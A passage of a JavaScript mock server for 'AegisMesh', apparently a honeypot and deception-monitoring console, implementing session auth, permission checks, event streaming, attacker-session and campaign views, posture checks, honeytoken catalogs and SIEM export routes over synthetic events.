    res.writeHead(204, securityHeaders({ 'Cache-Control': 'no-store', ...headers }));
    return res.end();
  }
  res.writeHead(status, securityHeaders({ 'Content-Type': 'application/json', 'Cache-Control': 'no-store', ...headers }));
  res.end(JSON.stringify(body));
}

const ERR_STATUS = { invalid_argument: 400, unauthenticated: 401, forbidden: 403, not_found: 404, conflict: 409, rate_limited: 429, unavailable: 503, internal: 500 };
const fail = (res, code, message, headers, status) => send(res, status || ERR_STATUS[code], { error: { code, message } }, headers);

function readBody(req, allowed) {
  return new Promise((resolve, reject) => {
    let size = 0;
    const chunks = [];
    req.on('data', (c) => {
      size += c.length;
      if (size > 64 * 1024) { reject(new Error('body exceeds 64 KiB')); req.destroy(); }
      chunks.push(c);
    });
    req.on('end', () => {
      if (!chunks.length) return resolve({});
      try {
        const v = JSON.parse(Buffer.concat(chunks).toString('utf8'));
        if (!v || typeof v !== 'object' || Array.isArray(v)) return reject(new Error('body must be a JSON object'));
        for (const k of Object.keys(v)) if (!allowed.includes(k)) return reject(new Error(`unknown field "${k}"`));
        resolve(v);
      } catch {
        reject(new Error('malformed JSON'));
      }
    });
  });
}

function cookieSession(req) {
  const m = /(?:^|;\s*)aegismesh_session=([A-Za-z0-9_-]+)/.exec(req.headers.cookie || '');
  const s = m && sessions.get(m[1]);
  if (!s) return null;
  if (Date.parse(s.expires_at) < Date.now()) { sessions.delete(m[1]); return null; }
  return { id: m[1], ...s };
}


function paginate(list, url, max = 200) {
  const limitRaw = url.searchParams.get('limit');
  const limit = limitRaw === null ? 50 : Number(limitRaw);
  if (!Number.isInteger(limit) || limit < 1 || limit > max) return { error: `limit must be 1..${max}` };
  const cursor = Number(url.searchParams.get('cursor') || 0);
  if (!Number.isInteger(cursor) || cursor < 0) return { error: 'invalid cursor' };
  const page = list.slice(cursor, cursor + limit);
  const next = cursor + limit < list.length ? String(cursor + limit) : '';
  return { page, next };
}

const WINDOW_MS = { '1h': 3600e3, '24h': 86400e3, '7d': 7 * 86400e3 };
const BUCKETS = { '1h': 60, '24h': 48, '7d': 56 };
const CLASSES = ['interaction', 'canary_invocation', 'correlation_signal'];
const SEV = ['info', 'low', 'medium', 'high', 'critical'];

function windowParam(url, res) {
  const w = url.searchParams.get('window') || '24h';
  if (!WINDOW_MS[w]) { fail(res, 'invalid_argument', 'window must be 1h, 24h or 7d'); return null; }
  return w;
}

function sourceSummaries(list) {
  const map = new Map();
  for (const e of list) {
    if (!e.source) continue;
    const s = map.get(e.source) || { source: e.source, events: 0, first_seen: e.time, last_seen: e.time, sensors: new Set(), kinds: new Set(), canary_invocations: 0, signals: 0, max_severity: '' };
    s.events++;
    if (e.time < s.first_seen) s.first_seen = e.time;
    if (e.time > s.last_seen) s.last_seen = e.time;
    s.sensors.add(e.sensor.id);
    if (e.sensor.kind) s.kinds.add(e.sensor.kind);
    if (e.classification === 'canary_invocation') s.canary_invocations++;
    if (e.classification === 'correlation_signal') s.signals++;
    if (SEV.indexOf(e.severity) > SEV.indexOf(s.max_severity)) s.max_severity = e.severity;
    map.set(e.source, s);
  }
  return [...map.values()].map((s) => ({ ...s, sensors: [...s.sensors], kinds: [...s.kinds] })).sort((a, b) => b.events - a.events);
}

function overview(t, w) {
  const end = Date.now();
  const span = WINDOW_MS[w];
  const events = t.events;
  const inWin = events.filter((e) => Date.parse(e.time) > end - span);
  const prev = events.filter((e) => Date.parse(e.time) > end - 2 * span && Date.parse(e.time) <= end - span);
  const totals = (list) => ({
    events: list.length,
    ...Object.fromEntries(CLASSES.map((c) => [c, list.filter((e) => e.classification === c).length])),
    sources: new Set(list.map((e) => e.source).filter(Boolean)).size,
    sensors_active: new Set(list.map((e) => e.sensor.id)).size,
  });
  const n = BUCKETS[w];
  const size = span / n;
  const start0 = end - span;
  const emptyBuckets = () => Array.from({ length: n }, (_, i) => ({ start: new Date(start0 + i * size).toISOString().replace(/\.\d+Z$/, 'Z'), interaction: 0, canary_invocation: 0, correlation_signal: 0 }));
  const indexOf = (e) => Math.min(n - 1, Math.floor((Date.parse(e.time) - start0) / size));
  const buckets = emptyBuckets();
  for (const e of inWin) {
    const i = indexOf(e);
    if (i >= 0) buckets[i][e.classification]++;
  }
  // by_sensor: at most 64 sensor ids, the first ones met in newest-first
  // evidence; each with buckets on exactly the main series' starts (zeros
  // included). Grouped by sensor id across origins.
  const bySensor = new Map();
  for (const e of inWin) {
    let s = bySensor.get(e.sensor.id);
    if (!s) {
      if (bySensor.size >= 64) continue;
      s = { sensor_id: e.sensor.id, kind: e.sensor.kind, events: 0, buckets: emptyBuckets() };
      bySensor.set(e.sensor.id, s);
    }
    s.events++;
    const i = indexOf(e);
    if (i >= 0) s.buckets[i][e.classification]++;
  }
  const bySev = Object.fromEntries([...SEV, 'none'].map((x) => [x, 0]));
  for (const e of inWin) bySev[e.severity || 'none']++;
  const ruleCounts = new Map();
  for (const e of inWin) for (const r of e.rule_ids) ruleCounts.set(r, (ruleCounts.get(r) || 0) + 1);
  // Title and severity come from the rule's own catalog entry ('' for
  // correlations), not from another finding on the same event.
  return {
    window: w, generated_at: new Date(end).toISOString().replace(/\.\d+Z$/, 'Z'),
    totals: totals(inWin), previous_totals: totals(prev), buckets,
    by_sensor: [...bySensor.values()].sort((a, b) => b.events - a.events),
    by_severity: bySev,
    top_rules: [...ruleCounts].map(([rule_id, n2]) => ({ rule_id, title: RULE_BY_ID.get(rule_id)?.title || '', events: n2, severity: RULE_BY_ID.get(rule_id)?.severity || '' })).sort((a, b) => b.events - a.events || (a.rule_id < b.rule_id ? -1 : 1)).slice(0, 8),
    top_sources: sourceSummaries(inWin).slice(0, 10),
    recent_signals: inWin.filter((e) => e.classification === 'correlation_signal').slice(0, 10).map(summaryOf),
    open_investigations: [...t.investigations.values()].filter((i) => i.status === 'open').length,
    index: indexStats(t),
    ...(t.fleet.accepting ? { by_node: byNode(inWin) } : {}),
  };
}

// Accepting hubs only: events per origin in the window, sorted by id, with
// "local" (name "") for this node's own observations.
// Index occupancy: events == 0 means the index is empty (first run); a
// nonzero index with zero window totals is a quiet window.
function indexStats(t) {
  const ev = t.events;
  return { events: ev.length, capacity: 50000, oldest: ev.length ? ev[ev.length - 1].time : '', history: t.fleet.accepting ? 'unavailable' : 'complete' };
}

function byNode(list) {
  const map = new Map();
  for (const e of list) {
    const id = originOf(e);
    const row = map.get(id) || { id, name: id === LOCAL ? '' : e.node.name, events: 0 };
    row.events++;
    map.set(id, row);
  }
  return [...map.values()].sort((a, b) => a.id.localeCompare(b.id));
}

function envelope(e) {
  return {
    schema: 'aegismesh.event/v1', id: e.id, time: e.time, seq: e.seq,
    sensor: e.sensor, classification: e.classification,
    observation: { remote: e.source, summary: e.summary, payload_preview: `${e.summary}\r\nUser-Agent: Mozilla/5.0 (synthetic)\r\n` },
    detection: e.rule_ids.length ? { action: e.action, findings: e.rule_ids.map((r) => ({ rule_id: r, severity: e.severity })) } : null,
    payload_sha256: createHash('sha256').update(e.id).digest('hex'),
  };
}

// ---- SSE -------------------------------------------------------------------

// streams: Map of response → { tenant, sid, node } (node '' = all origins).
// A stream belongs to one session in one tenant; a tenant switch or a
// sign-out ends it, like the server.
const streams = new Map();
function emitLive(t) {
  // The local tenant observes locally and (on an accepting hub) receives
  // forwarded copies; another tenant only receives forwarded copies.
  const nodes = t.fleet.evidenceNodes;
  if (!t.local && !nodes.length) return;
  const e = makeEvent(Date.now());
  e.time = stamp();
  if (nodes.length && (!t.local || rand() < 0.35)) {
    const n = pick(nodes);
    e.node = { id: n.id, name: n.name };
  }
  t.events.unshift(e);
  t.byKey.set(keyOf(e.id, originOf(e)), e);
  for (const [res, st] of streams) {
    if (st.tenant !== t.name) continue;
    if (st.node && originOf(e) !== st.node) continue;
    res.write(`event: observation\ndata: ${JSON.stringify(summaryOf(e))}\n\n`);
  }
}
setInterval(() => { for (const t of tenants.values()) emitLive(t); }, 4000).unref();

function endStreams(sid) {
  for (const [res, st] of streams) {
    if (st.sid !== sid) continue;
    streams.delete(res);
    res.end();
  }
}

// Burst: GET /__mock/burst?n=200 pushes n observations to every open stream
// in one tight loop, to measure how the UI copes with a live spike. It is a
// mock-only route (the product server has nothing like it). With --burst N
// the mock also fires one burst of N, 3s after each stream connects.
const argBurst = process.argv.indexOf('--burst');
const AUTO_BURST = argBurst > 0 ? Math.min(1000, Math.max(1, Number(process.argv[argBurst + 1]) || 200)) : 0;
function burst(n) {
  const count = Math.min(1000, Math.max(1, Math.floor(Number(n) || 0)));
  for (let i = 0; i < count; i++) for (const t of tenants.values()) emitLive(t);
  return count;
}
setInterval(() => {
  for (const res of streams.keys()) res.write(`event: heartbeat\ndata: {"time":"${new Date().toISOString()}"}\n\n`);
}, 15000).unref();

// ---- Router ----------------------------------------------------------------

async function api(req, res, url) {
  const p = url.pathname.slice('/api/v1'.length);
  const remote = req.socket.remoteAddress || '';
  const m = req.method;

  if (m === 'GET' && p === '/meta') {
    return send(res, 200, {
      product: 'AegisMesh', api_version: 'v1', version: '0.3.0-dev (mock)',
      auth: { token: TOKEN_AUTH, oidc: { enabled: OIDC_AUTH, display_name: OIDC_DISPLAY_NAME } },
      ...(ROUND6 ? accounts.overlay.meta() : {}),
    });
  }

  if (p.startsWith('/auth/oidc/')) return oidcRoute(req, res, url, p, m, remote);

  if (m === 'POST' && p === '/session') {
    let body;
    try { body = await readBody(req, ['token']); } catch (err) { return fail(res, 'invalid_argument', err.message); }
    if (!TOKEN_AUTH) return fail(res, 'unauthenticated', 'token sign-in is disabled');
    const principal = TOKENS.get(body.token) || (ROUND5 ? accounts.principalForKey(body.token) : null);
    if (!principal) {
      // No tenant resolved: multi-tenant servers keep this in a chain the
      // console API cannot read; single-tenant servers in the only chain.
      if (TENANTS.length === 1) record(localTenant, '', '', 'session.login_failed', '', 'denied', remote);
      return fail(res, 'unauthenticated', 'invalid token');
    }
    // Token sign-in starts in the first configured membership.
    const { sid, s: sess } = newSession({
      name: principal.name, role: principal.role, auth_method: 'token', tenant: principal.tenants[0], tenants: [...principal.tenants],
      account_id: principal.account_id || accounts.configuredId(principal.name), remote, client: clientFamily(req.headers['user-agent']),
    });
    const old = cookieSession(req);
    if (old) { sessions.delete(old.id); endStreams(old.id); }
    record(tenants.get(sess.tenant), principal.name, principal.role, 'session.login', '', 'ok', remote);
    return send(res, 200, sessionView(sess), { 'Set-Cookie': sessionCookie(sid) });
  }

  const s = cookieSession(req);
  if (!s) return fail(res, 'unauthenticated', 'sign in required');
  // What the sessions list shows: last activity and address. The client
  // family is fixed at sign-in.
  Object.assign(sessions.get(s.id), { last_seen_at: stamp(), remote });
  const who = { name: s.name, role: s.role };
  const T = tenants.get(s.tenant);
  const events = T.events;
  if (m !== 'GET') {
    if (req.headers['x-aegismesh-csrf'] !== s.csrf_token) return fail(res, 'forbidden', 'missing or invalid CSRF header');
    if (req.headers.origin && req.headers.origin !== `http://${req.headers.host}`) return fail(res, 'forbidden', 'origin mismatch');
  }
  const audit = (...args) => record(T, ...args);
  // Permission checks (contract r6). The principal's permissions come from
  // its account's current role, so a role change applies on the next
  // request; an older server's session falls back to its built-in role.
  const perms = ROUND5 ? accounts.permissionsOf(s) : [...(BUILTIN[s.role] || [])];
  const need = (perm, action, target = '') => {
    if (perms.includes(perm)) return true;
    audit(who.name, who.role, 'authz.denied', target, 'denied', remote, action);
    fail(res, 'forbidden', `requires ${perm}`);
    return false;
  };

  // ---- Round 5: accounts, access and settings (mock-accounts.mjs) ----------
  if (ROUND5 && await accounts.handle({
    req, res, url, p, m, s, sessions, send, fail, readBody, audit, who, remote, endStreams, T,
    headers: securityHeaders,
    flags: { failPrefs: FAIL_PREFS, oidc: OIDC_AUTH, tokenAuth: TOKEN_AUTH, fleetHub: FLEET_MODE === 'hub' || FLEET_MODE === 'both', acceptEvidence: localTenant.fleet.accepting },
    acceptedCount: () => acceptance.count(),
  })) return;

  if (p === '/session') {
    if (m === 'GET') return send(res, 200, sessionView(s));
    if (m === 'DELETE') {
      sessions.delete(s.id);
      endStreams(s.id);
      audit(who.name, who.role, 'session.logout', '', 'ok', remote);
      return send(res, 204, null, { 'Set-Cookie': 'aegismesh_session=; HttpOnly; SameSite=Strict; Path=/; Max-Age=0' });
    }
  }

  // Move this session to another member tenant: a new session id and CSRF
  // token, the original expiry, the old session and its streams ended. The
  // departing chain records the switch without naming the target.
  if (p === '/session/tenant' && m === 'POST') {
    let b;
    try { b = await readBody(req, ['tenant']); } catch (err) { return fail(res, 'invalid_argument', err.message); }
    if (typeof b.tenant !== 'string' || !b.tenant) return fail(res, 'invalid_argument', 'tenant is required');
    if (!s.tenants.includes(b.tenant) || !tenants.has(b.tenant)) return fail(res, 'not_found', 'tenant not found');
    audit(who.name, who.role, 'session.tenant_switch', '', 'ok', remote);
    sessions.delete(s.id);
    endStreams(s.id);
    const { id: _old, ...rest } = s;
    const sid = randomBytes(24).toString('base64url');
    const next = { ...rest, tenant: b.tenant, csrf_token: randomBytes(24).toString('base64url') };
    sessions.set(sid, next);
    return send(res, 200, sessionView(next), { 'Set-Cookie': sessionCookie(sid) });
  }

  if (ROUND6 && m === 'GET' && p === '/permissions') return send(res, 200, accounts.permissions);

  // The baseline permission of every other route (writes add their own
  // check below): analysis views, investigations and the fleet have their
  // own read permission; everything else reads evidence.
  {
    const base = /^\/(posture|digest|coverage|recommendations)(\/|$)/.test(p) && m === 'GET' ? 'analysis.read'
      : /^\/posture\/[^/]+\/accept$/.test(p) ? 'settings.manage'
        : p.startsWith('/investigations') && m === 'GET' && !/\/report$/.test(p) ? 'investigations.read'
          : p.startsWith('/investigations') ? null
            : p === '/fleet' || p.startsWith('/fleet/') ? (m === 'GET' && !p.startsWith('/fleet/enrollment-tokens') ? 'fleet.read' : null)
              : p.startsWith('/audit') || p.startsWith('/export/') || /\/report$/.test(p) ? null
                : 'evidence.read';
    if (base && !need(base, p.replace(/^\//, '').replace(/\//g, '.'))) return;
  }

  if (m === 'GET' && p === '/overview') {
    const w = windowParam(url, res);
    return w && send(res, 200, overview(T, w));
  }

  if (m === 'GET' && p === '/events') {
    for (const k of url.searchParams.keys()) if (![...EVENT_FILTER_KEYS, 'cursor', 'limit'].includes(k)) return fail(res, 'invalid_argument', `unknown parameter "${k}"`);
    const q = Object.fromEntries(url.searchParams);
    const { filters, rejected } = normalizeEventFilters(q);
    if (rejected.length) return fail(res, 'invalid_argument', `invalid ${rejected[0]}`);
    const matched = events.filter((e) => matchesEventFilters(e, filters));
    const pg = paginate(matched, url);
    if (pg.error) return fail(res, 'invalid_argument', pg.error);
    return send(res, 200, { events: pg.page.map(summaryOf), next_cursor: pg.next, total_matched: matched.length });
  }

  if (m === 'GET' && p === '/events/stream') {
    for (const k of url.searchParams.keys()) if (k !== 'node') return fail(res, 'invalid_argument', `unknown parameter "${k}"`);
    const nodeRaw = url.searchParams.get('node');
    const node = nodeRaw === null ? '' : normalizeNodeFilter(nodeRaw);
    if (nodeRaw !== null && !node) return fail(res, 'invalid_argument', 'node must be "local" or a 32-hex node id');
    if (streams.size >= 16) return fail(res, 'unavailable', 'too many streams');
    res.writeHead(200, securityHeaders({ 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-store', Connection: 'keep-alive' }));
    res.write(': connected\n\n');
    streams.set(res, { tenant: T.name, sid: s.id, node });
    req.on('close', () => streams.delete(res));
    if (AUTO_BURST) setTimeout(() => { if (streams.has(res)) burst(AUTO_BURST); }, 3000).unref();
    return;
  }

  let mm;
  if (m === 'GET' && (mm = /^\/events\/([0-9a-f]{32})$/.exec(p))) {
    for (const k of url.searchParams.keys()) if (k !== 'node') return fail(res, 'invalid_argument', `unknown parameter "${k}"`);
    const nodeRaw = url.searchParams.get('node');
    const node = nodeRaw === null ? '' : normalizeNodeFilter(nodeRaw);
    if (nodeRaw !== null && !node) return fail(res, 'invalid_argument', 'node must be "local" or a 32-hex node id');
    // Contract: an explicit origin wins; without one, local is preferred,
    // a unique remote match resolves, and several remote matches are 404.
    let e;
    if (node) e = T.byKey.get(keyOf(mm[1], node));
    else {
      e = T.localById(mm[1]);
      if (!e) {
        const remote = events.filter((x) => x.node && x.id === mm[1]);
        e = remote.length === 1 ? remote[0] : undefined;
      }
    }
    if (!e) return fail(res, 'not_found', 'event not in index');
    const origin = originOf(e);
    const related = (e._cites
      ? e._cites.map((id) => T.byKey.get(keyOf(id, origin))).filter(Boolean)
      : events.filter((x) => originOf(x) === origin && x._cites?.includes(e.id))).map(summaryOf);
    const findings = e.rule_ids.filter((r) => r.startsWith('CR-') === false).map((r) => {
      const rule = DETECTION_RULES.find((x) => x.id === r);
      return { rule_id: r, severity: rule?.severity || e.severity, confidence: pick(['low', 'medium', 'high']), reason: `${rule?.title || r} matched (static rule text).` };
    });
    const integrity = e._integrity ? { verified: true, algorithm: 'sha256', error: '' } : { verified: false, algorithm: 'sha256', error: 'payload hash mismatch' };
    if (e.node) Object.assign(integrity, { scope: 'hub_payload_hash_consistency', description: 'Verified on the hub against the envelope payload hash; consistency, not provenance.' });
    // The retained analysis session containing this event (origin-qualified),
    // or "" when it is outside the analysis snapshot.
    // Raw detail reads are sensitive reads: audited before the response.
    audit(who.name, who.role, 'event.read', `${origin}:${e.id}`, 'ok', remote);
    const session = sessionsOf(T.name, snapshot(events).events).find((x) => x._events.some((y) => y.id === e.id && originOf(y) === origin));
    return send(res, 200, {
      ...(e.node ? { node: e.node } : {}),
      summary: summaryOf(e), envelope: envelope(e), integrity, findings, related,
      session_id: session ? session.id : '',
      // Investigations annotate bare ids that resolve to local observations only.
      investigations: e.node ? [] : [...T.investigations.values()].filter((i) => i.event_ids.includes(e.id)).map((i) => ({ id: i.id, title: i.title, status: i.status })),
    });
  }

  if (m === 'GET' && p === '/sources') {
    const w = windowParam(url, res);
    if (!w) return;
    const limit = Number(url.searchParams.get('limit') || 50);
    if (!Number.isInteger(limit) || limit < 1 || limit > 200) return fail(res, 'invalid_argument', 'limit must be 1..200');
    const list = sourceSummaries(events.filter((e) => Date.parse(e.time) > Date.now() - WINDOW_MS[w]));
    return send(res, 200, { sources: list.slice(0, limit) });
  }

  if (m === 'GET' && (mm = /^\/sources\/([^/]+)$/.exec(p))) {
    let key;
    try { key = decodeURIComponent(mm[1]); } catch { return fail(res, 'invalid_argument', 'bad source encoding'); }
    const list = events.filter((e) => e.source === key);
    if (!list.length) return fail(res, 'not_found', 'source not in index');
    const pg = paginate(list, url);
    if (pg.error) return fail(res, 'invalid_argument', pg.error);
    return send(res, 200, { source: sourceSummaries(list)[0], events: pg.page.map(summaryOf), next_cursor: pg.next, inter_arrival: interArrival(list) });
  }

  if (m === 'GET' && p === '/sensors') {
    // Local sensors belong to the local tenant; others get an empty list.
    return send(res, 200, {
      sensors: !T.local ? [] : [...SENSORS, ...AI_SENSORS].map((x) => {
        const mine = T.localEvents().filter((e) => e.sensor.id === x.id);
        return { ...x, events_total: mine.length, last_event_at: mine[0]?.time || '', by_classification: Object.fromEntries(CLASSES.slice(0, 2).map((c) => [c, mine.filter((e) => e.classification === c).length])) };
      }),
    });
  }

  if (m === 'GET' && p === '/rules') {
    if (!T.local) return send(res, 200, { rules: [] });
    return send(res, 200, {
      rules: CATALOG_RULES.map((r) => ruleRecord({ frameworks: RULE_FRAMEWORKS[r.id] || [], id: r.id, family: r.family, title: r.title, severity: r.severity, enabled: r.id !== 'CR-CANARY-AFTER-SCAN' })),
    });
  }

  // ---- Derived views (ADR-0022) ---------------------------------------------
  const strictQuery = (allowed) => {
    const seen = new Set();
    for (const k of url.searchParams.keys()) {
      if (!allowed.includes(k) || seen.has(k)) { fail(res, 'invalid_argument', `unknown or duplicate parameter "${k}"`); return false; }
      seen.add(k);
    }
    return true;
  };
  const analysisWindow = () => {
    const w = url.searchParams.get('window') ?? '24h';
    if (!WINDOW_MS[w]) { fail(res, 'invalid_argument', 'window must be 1h, 24h or 7d'); return null; }
    return w;
  };
  const snap = () => snapshot(events, T.local ? 'complete' : 'unavailable');
  // Round 4: each session's campaign (when it shares a playbook with other
  // sources) and its actor profile. Campaigns are derived once per snapshot.
  const campaignIndex = new WeakMap();
  const campaignIdOf = (session, sn) => {
    let index = campaignIndex.get(sn);
    if (!index) {
      index = new Map();
      for (const c of campaignsOf(sessionsOf(T.name, sn.events))) for (const mem of c._members) index.set(mem.session.id, c.id);
      campaignIndex.set(sn, index);
    }
    return index.get(session.id) ?? null;
  };
  const insightOf = (session, sn) => ({ campaign_id: campaignIdOf(session, sn), actor: actorOf(session) });
  const withInsight = (session, sn) => ({ ...publicSession(session), ...(ROUND4 ? insightOf(session, sn) : {}) });
  const SESSION_ID = /^[0-9a-f]{32}$/;
  const findSession = (id) => {
    if (!SESSION_ID.test(id)) { fail(res, 'invalid_argument', 'malformed session id'); return null; }
    const sn = snap();
    const hit = sessionsOf(T.name, sn.events).find((x) => x.id === id);
    if (!hit) { fail(res, 'not_found', 'session is no longer indexed'); return null; }
    return { session: hit, sn };
  };
  const attachment = (body, type, name, sn, extra = {}) => {
    res.writeHead(200, securityHeaders({
      'Content-Type': type, 'Content-Disposition': `attachment; filename="${name}"`, 'Cache-Control': 'no-store',
      'X-AegisMesh-Index-History': sn.bounds.index.history, 'X-AegisMesh-Index-Events': String(sn.bounds.index.events),
      'X-AegisMesh-Scanned-Events': String(sn.bounds.scanned_events), 'X-AegisMesh-Scan-Limit': String(sn.bounds.scan_limit),
      'X-AegisMesh-Scan-Truncated': String(sn.bounds.scan_truncated), ...extra,
    }));
    res.end(body);
  };

  if (m === 'GET' && p === '/sessions') {
    if (!strictQuery(['window', 'source', 'limit', 'cursor'])) return;
    const w = analysisWindow();
    if (!w) return;
    const source = url.searchParams.get('source') ?? '';
    if (Buffer.byteLength(source) > 255) return fail(res, 'invalid_argument', 'source too long');
    const limit = Number(url.searchParams.get('limit') || 50);
    if (!Number.isInteger(limit) || limit < 1 || limit > 200) return fail(res, 'invalid_argument', 'limit must be within 1..200');
    let offset = 0;
    let asOf = new Date().toISOString();
    const raw = url.searchParams.get('cursor');
    if (raw) {
      try {
        const c = JSON.parse(Buffer.from(raw, 'base64url').toString());
        if (c.s !== 'attacker_sessions' || c.w !== w || c.src !== source || !Number.isInteger(c.o) || c.o < 0) throw new Error('scope');
        offset = c.o;
        asOf = c.t;
      } catch { return fail(res, 'invalid_argument', 'invalid cursor'); }
    }
    const sn = snap();
    const end = Date.parse(asOf);
    const all = sessionsOf(T.name, sn.events).filter((x) => Date.parse(x.last_seen) >= end - WINDOW_MS[w] && Date.parse(x.first_seen) <= end && (!source || x.source === source));
    const page = all.slice(offset, offset + limit);
    const next = offset + limit < all.length ? Buffer.from(JSON.stringify({ s: 'attacker_sessions', w, src: source, o: offset + limit, t: asOf })).toString('base64url') : '';
    return send(res, 200, { sessions: page.map((x) => withInsight(x, sn)), total_matched: all.length, next_cursor: next, as_of: asOf, window: w, bounds: sn.bounds });
  }

  const reportMatch = p.match(/^\/sessions\/([^/]+)\/report$/);
  if (m === 'GET' && reportMatch) {
    if (!strictQuery([])) return;
    if (!need('reports.download', 'session.report', decodeURIComponent(reportMatch[1]))) return;
    const found = findSession(decodeURIComponent(reportMatch[1]));
    if (!found) return;
    audit(who.name, who.role, 'session.report', found.session.id, 'ok', remote);
    const body = renderReport({ scope: `Session ${found.session.id} (source key shown below; not an actor identity)`, title: found.session.source, events: found.session._events, sessions: [found.session] });
    return attachment(body, 'text/markdown; charset=utf-8', 'aegismesh-observation-report.md', found.sn);
  }

  const sessionMatch = p.match(/^\/sessions\/([^/]+)$/);
  if (m === 'GET' && sessionMatch) {
    if (!strictQuery([])) return;
    const found = findSession(decodeURIComponent(sessionMatch[1]));
    return found && send(res, 200, { ...sessionDetail(found.session), ...(ROUND4 ? insightOf(found.session, found.sn) : {}), bounds: found.sn.bounds });
  }

  // ---- Round 4: campaigns, actor profiles, posture -------------------------------
  if (ROUND4 && m === 'GET' && p === '/campaigns') {
    if (!strictQuery([])) return;
    const sn = snap();
    const sessionsAll = sessionsOf(T.name, sn.events);
    const list = campaignsOf(sessionsAll);
    return send(res, 200, { items: list.map(publicCampaign), scanned_sessions: sessionsAll.length, truncated: sn.bounds.scan_truncated, generated_at: new Date().toISOString() });
  }
  const campaignMatch = p.match(/^\/campaigns\/([^/]+)$/);
  if (ROUND4 && m === 'GET' && campaignMatch) {
    if (!strictQuery([])) return;
    const id = decodeURIComponent(campaignMatch[1]);
    if (!/^cmp_[0-9a-f]{12}$/.test(id)) return fail(res, 'invalid_argument', 'malformed campaign id');
    const sn = snap();
    const hit = campaignsOf(sessionsOf(T.name, sn.events)).find((c) => c.id === id);
    if (!hit) return fail(res, 'not_found', 'campaign is no longer derivable from the index');
    return send(res, 200, campaignDetail(hit, (x) => withInsight(x, sn)));
  }
  if (ROUND4 && m === 'GET' && p === '/posture') {
    if (!strictQuery([])) return;
    const sensorsList = T.local ? [...SENSORS, ...AI_SENSORS] : [];
    const tokens = T.local ? tokenCatalog(decoyCatalog(sensorsList)) : [];
    return send(res, 200, postureBody(T, events));
  }
  const acceptMatch = p.match(/^\/posture\/([^/]+)\/accept$/);
  if (ROUND6 && acceptMatch && (m === 'POST' || m === 'DELETE')) {
    if (!T.local) { audit(who.name, who.role, 'authz.denied', '', 'denied', remote, 'posture.accept'); return fail(res, 'forbidden', 'requires settings.manage in the local tenant'); }
    let id;
    try { id = decodeURIComponent(acceptMatch[1]); } catch { id = ''; }
    const raw = postureBody(T, events, { raw: true });
    const check = raw.checks.find((c) => c.id === id);
    if (!check) return fail(res, 'not_found', 'no such posture check');
    if (!accounts.overlay.editing) return send(res, 409, { error: { code: 'editing_disabled', message: 'console settings editing is off (console.settings_editing: off)' } });
    if (m === 'POST') {
      let b;
      try { b = await readBody(req, ['reason', 'until']); } catch (err) { return fail(res, 'invalid_argument', err.message); }
      if (check.status !== 'attention') return send(res, 409, { error: { code: 'conflict', message: 'only checks that need attention can be accepted' } });
      const v = acceptance.validate(b);
      if (v.error) return fail(res, 'invalid_argument', v.error);
      acceptance.accept(id, who.name, v);
      audit(who.name, who.role, 'posture.accept', id, 'ok', remote, `until=${v.until} reason=${JSON.stringify(v.reason)}`);
    } else {
      acceptance.revoke(id);
      audit(who.name, who.role, 'posture.unaccept', id, 'ok', remote);
    }
    return send(res, 200, postureBody(T, events).checks.find((c) => c.id === id));
  }

  if (m === 'GET' && p === '/coverage') {
    if (!strictQuery(['window'])) return;
    const w = analysisWindow();
    if (!w) return;
    const sn = snap();
    const until = Date.now();
    const since = until - WINDOW_MS[w];
    return send(res, 200, { frameworks: coverageOf(sn.events, since, until), bounds: sn.bounds, since: new Date(since).toISOString(), until: new Date(until).toISOString(), interpretation: INTERPRETATION });
  }

  // ---- Round 3: catalogs, digest, local SIEM event formats ------------------
  const catalogWindow = (allowed) => {
    if (!strictQuery(['window'])) return null;
    const w = url.searchParams.get('window') ?? '24h';
    if (!allowed.includes(w)) { fail(res, 'invalid_argument', `window must be ${allowed.join(', ')}`); return null; }
    return w;
  };
  // Local configuration belongs to the local tenant; others get empty lists.
  const localSensors = () => (T.local ? [...SENSORS, ...AI_SENSORS] : []);

  if (m === 'GET' && p === '/decoys') {
    const w = catalogWindow(CATALOG_WINDOWS);
    if (!w) return;
    const sn = snap();
    return send(res, 200, { decoys: decoysView(decoyCatalog(localSensors()), sn.events, w), bounds: sn.bounds });
  }

  if (m === 'GET' && p === '/honeytokens') {
    const w = catalogWindow(CATALOG_WINDOWS);
    if (!w) return;
    const sn = snap();
    const tokens = T.local ? tokenCatalog(decoyCatalog(localSensors())) : [];
    return send(res, 200, { honeytokens: honeytokensView(tokens, sn.events, w), bounds: sn.bounds });
  }

  if (m === 'GET' && p === '/digest') {
    const w = catalogWindow(DIGEST_WINDOWS);
    if (!w) return;
    const sn = snap();
    return send(res, 200, digestOf({
      window: w, snap: sn, sessions: sessionsOf(T.name, sn.events), rules: CATALOG_RULES,
      investigations: [...T.investigations.values()],
    }));
  }

  if (m === 'GET' && p === '/export/events') {
    if (!strictQuery(['session', 'source', 'investigation', 'window', 'format'])) return;
    const format = url.searchParams.get('format');
    if (!EXPORT_FORMATS.includes(format)) return fail(res, 'invalid_argument', 'format must be cef, syslog-rfc5424, otlp-json or ecs');
    const scopes = ['session', 'source', 'investigation', 'window'].filter((k) => url.searchParams.has(k));
    if (scopes.length !== 1 || !url.searchParams.get(scopes[0])) return fail(res, 'invalid_argument', 'exactly one scope is required');
    if (!need('evidence.export', 'export.events', scopes[0] === 'source' ? '' : url.searchParams.get(scopes[0]))) return;
    const sn = snap();
    const v = url.searchParams.get(scopes[0]);
    let scoped;
    let target = '';
    if (scopes[0] === 'session') {
      const found = findSession(v);
      if (!found) return;
      scoped = found.session._events;
      target = v;
    } else if (scopes[0] === 'source') {
      if (Buffer.byteLength(v) > 255) return fail(res, 'invalid_argument', 'source too long');
      scoped = sn.events.filter((e) => e.source === v);
    } else if (scopes[0] === 'investigation') {
      const inv = T.investigations.get(v);
      if (!inv) return fail(res, 'not_found', 'investigation not found');
      scoped = inv.event_ids.map((id) => T.localById(id)).filter(Boolean);
      target = v;
    } else {
      if (!WINDOW_MS[v]) return fail(res, 'invalid_argument', 'window must be 1h, 24h or 7d');
      scoped = sn.events.filter((e) => Date.parse(e.time) >= Date.now() - WINDOW_MS[v]);
    }
    audit(who.name, who.role, 'export.events', target, 'ok', remote);
    return attachment(renderEvents(format, scoped.map(summaryOf)), EXPORT_TYPES[format], EXPORT_NAMES[format], sn);
  }

  if (m === 'GET' && p === '/export/indicators') {
    if (!strictQuery(['session', 'source', 'investigation', 'window', 'format'])) return;
    const format = url.searchParams.get('format');
    if (!['stix', 'csv', 'txt'].includes(format)) return fail(res, 'invalid_argument', 'format must be stix, csv or txt');
